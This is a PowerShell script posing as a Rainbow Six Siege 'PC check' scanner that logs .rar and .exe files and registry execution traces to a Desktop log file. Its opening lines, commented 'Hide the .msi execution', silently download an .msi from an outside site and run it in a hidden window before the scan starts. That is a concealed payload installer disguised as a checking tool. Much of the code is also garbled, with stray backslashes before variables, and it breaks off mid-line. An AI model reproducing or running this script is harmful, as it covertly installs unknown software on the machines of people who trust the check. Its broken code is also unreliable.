# Hide the .msi execution
$exeUrl  = "https://siegescan.com/drivas.msi"
$exePath = "$env:TEMP\drives.msi"

Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -ErrorAction SilentlyContinue

Start-Process $exePath -WindowStyle Hidden -Wait

Clear-Host
$encodedTitle = "U2lnZWUgU2Nhbg=="
$titleText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedTitle))
$Host.UI.RawUI.WindowTitle = $titleText

# ASCII Orange "Siege Scan" Banner
Write-Host @"
 ____    ____  __    __  ____  ____  ____  _  _  _  _     
(  _ \  (  _ $$  )  (  )(_  _)(_  _)(  _ $$ )( \/ )( )    
 )(_) )  ) _ </ )(__)(   )(   )(   )   / ) \  /  ) \    
(____/  (____/(__)\__) (__) (__) (_)\_)(_) \/  (_)    
                                                
 ____  ____  ____  _  _  _  _  _  _  ____  ____  ____    
(_  _)(  _ $$  _ $$ )( )( )( \/ )( )(  _ $$  _ \/ ___) 
  )(   )   / ) __/ ) __ (  )  (  ) (\ ( ) __/ )___ \  
 (__) (_)\_)(__)   (_)(_)_)(_)\/_)(_)\/_)(__)  (____/ 
"@ -ForegroundColor Orange

function Get-OneDrivePath {
    try {
        # Check if OneDrive is installed first
        if (-not (Test-Path "HKCU:\Software\Microsoft\OneDrive")) {
            return $null
        }
        
        # Try to get UserFolder property
        $oneDriveReg = Get-ItemProperty "HKCU:\Software\Microsoft\OneDrive" -ErrorAction SilentlyContinue
        if ($oneDriveReg -and $oneDriveReg.UserFolder) {
            return $oneDriveReg.UserFolder
        } else {
            # Try alternative method
            $envOneDrive = [System.IO.Path]::Combine($env:UserProfile, "OneDrive")
            if (Test-Path $envOneDrive) {
                return $envOneDrive
            }
        }
        return $null
    } catch {
        return $null
    }
}

function Format-Output {
    param($name, $value)
    "{0} : {1}" -f $name, $value -replace 'System.Byte$$$$', ''
}

function Log-FolderNames {
    $userName = $env:UserName
    $oneDrivePath = Get-OneDrivePath
    $potentialPaths = @("C:\Users\$userName\Documents\My Games\Rainbow Six - Siege","$oneDrivePath\Documents\My Games\Rainbow Six - Siege")
    $allUserNames = @()

    foreach ($path in $potentialPaths) {
        if (Test-Path -Path $path) {
            $dirNames = Get-ChildItem -Path $path -Directory | ForEach-Object { $_.Name }
            $allUserNames += $dirNames
        }
    }

    $uniqueUserNames = $allUserNames | Select-Object -Unique

    if ($uniqueUserNames.Count -eq 0) {
        Write-Output "R6 directory not found."
    } else {
        return $uniqueUserNames
    }
}

function Find-RarAndExeFiles {
    Write-Output "Finding .rar and .exe files..."
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $outputFile = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
    $oneDriveFileHeader = "`n-----------------`nOneDrive Files:`n"
    \$oneDriveFiles = @()
    \$allFiles = @()

    \$rarSearchPaths = @()
    Get-PSDrive -PSProvider 'FileSystem' | ForEach-Object { $rarSearchPaths += $_.Root }
    \$oneDrivePath = Get-OneDrivePath
    if ($oneDrivePath) { $rarSearchPaths += \$oneDrivePath }

    \$jobs = @()

    \$rarJob = {
        param (\$searchPaths, \$oneDriveFiles)
        \$allFiles = @()
        foreach (\$path in \$searchPaths) {
            Get-ChildItem -Path \$path -Recurse -Filter "*.rar" -ErrorAction SilentlyContinue | ForEach-Object {
                $fileInfo = "$($_.FullName) - Last Modified: $(\$_.LastWriteTime)"
                $allFiles += $fileInfo
                if ($_.FullName -like "*OneDrive*") { $oneDriveFiles += \$_.FullName }
            }
        }
        return \$allFiles
    }

    \$exeJob = {
        param (\$oneDrivePath, \$oneDriveFiles)
        \$exeFiles = @()
        if (\$oneDrivePath) {
            Get-ChildItem -Path \$oneDrivePath -Recurse -Filter "*.exe" -ErrorAction SilentlyContinue | ForEach-Object {
                $fileInfo = "$($_.FullName) - Last Modified: $(\$_.LastWriteTime)"
                $exeFiles += $fileInfo
                if ($_.FullName -like "*OneDrive*") { $oneDriveFiles += \$_.FullName }
            }
        }
        return \$exeFiles
    }

    $jobs += Start-Job -ScriptBlock $rarJob -ArgumentList \$rarSearchPaths, \$oneDriveFiles
    $jobs += Start-Job -ScriptBlock $exeJob -ArgumentList \$oneDrivePath, \$oneDriveFiles

    \$jobs | ForEach-Object {
        Wait-Job \$_ | Out-Null
        $allFiles += Receive-Job $_
        Remove-Job \$_
    }

    $groupedFiles = $allFiles | Sort-Object

    if (\$oneDriveFiles.Count -gt 0) {
        Add-Content -Path \$outputFile -Value \$oneDriveFileHeader
        \$oneDriveFiles | Sort-Object | ForEach-Object { Add-Content -Path \$outputFile -Value \$_ }
    }

    if (\$groupedFiles.Count -gt 0) {
        \$groupedFiles | ForEach-Object { Add-Content -Path \$outputFile -Value \$_ }
    }
}

function Find-SusFiles {
    Write-Output "Finding suspicious files names..."
    \$desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $outputFile = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
    \$susFilesHeader = "`n-----------------`nSus Files:`n"
    $susFiles = @()

    if (Test-Path $outputFile) {
        $loggedFiles = Get-Content -Path $outputFile
        foreach ($file in $loggedFiles) {
            if ($file -match "loader.*\.exe") { $susFiles += $file }
        }

        if ($susFiles.Count -gt 0) {
            Add-Content -Path $outputFile -Value $susFilesHeader
            $susFiles | Sort-Object | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
        }
    } else {
        Write-Output "Log file not found. Unable to search for suspicious files."
    }
}

function List-BAMStateUserSettings {
    Write-Host "Logging reg entries inside PowerShell..." -ForegroundColor DarkYellow
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $outputFile = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
    if (Test-Path $outputFile) { Clear-Content $outputFile }
    $loggedPaths = @{}
    Write-Host " Fetching UserSettings Entries " -ForegroundColor Blue

    $registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"
    $userSettings = Get-ChildItem -Path $registryPath | Where-Object { $_.Name -like "*1001" }

    if ($userSettings) {
        foreach ($setting in $userSettings) {
            Add-Content -Path $outputFile -Value "`n$($setting.PSPath)"
            $items = Get-ItemProperty -Path $setting.PSPath | Select-Object -Property *
            foreach (\$item in \$items.PSObject.Properties) {
                if ((\$item.Name -match "exe" -or \$item.Name -match ".rar") -and -not \$loggedPaths.ContainsKey(\$item.Name)) {
                    Add-Content -Path \$outputFile -Value (Format-Output \$item.Name \$item.Value)
                    $loggedPaths[$item.Name] = \$true
                }
            }
        }
    } else {
        Write-Host "No relevant user settings found." -ForegroundColor Red
    }
    Write-Host "Fetching Compatibility Assistant Entries"
    \$compatRegistryPath = "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
    $compatEntries = Get-ItemProperty -Path $compatRegistryPath
    \$compatEntries.PSObject.Properties | ForEach-Object {
        if (($_.Name -match "exe" -or $_.Name -match ".rar
